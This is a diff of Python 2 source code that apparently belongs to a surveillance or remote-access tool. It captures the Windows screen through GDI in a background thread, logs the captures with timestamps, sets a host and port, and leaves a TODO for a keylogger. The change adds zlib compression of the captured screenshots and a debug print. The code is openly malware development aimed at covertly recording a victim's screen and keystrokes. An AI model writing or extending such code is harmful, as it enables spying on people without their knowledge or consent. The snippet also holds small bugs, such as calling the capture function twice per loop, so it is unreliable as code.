@@ -13,6 +13,7 @@ import threading
 import subprocess
 import sched
 import datetime
+import zlib
 
 HOST = '127.0.0.1'
 PORT = 4434
@@ -141,7 +142,7 @@ def screen_bits():
             bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
     p_buf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
     Gdi32.GetBitmapBits(h_capture_bitmap, bmp_info.bmiHeader.biSizeimage, p_buf)
-    return p_buf
+    return zlib.compress(p_buf)
 
 
 # TODO: Keylogger, Scheduler
@@ -255,6 +256,7 @@ class Screenshoter(threading.Thread):
         while 1:
             config = init()
             if config['sts']:
+                print len(screen_bits())
                 delay = config['std']
                 SCREENSHOT_LOGS[datetime.datetime.now()] = {
                     'screen_bits': screen_bits(),
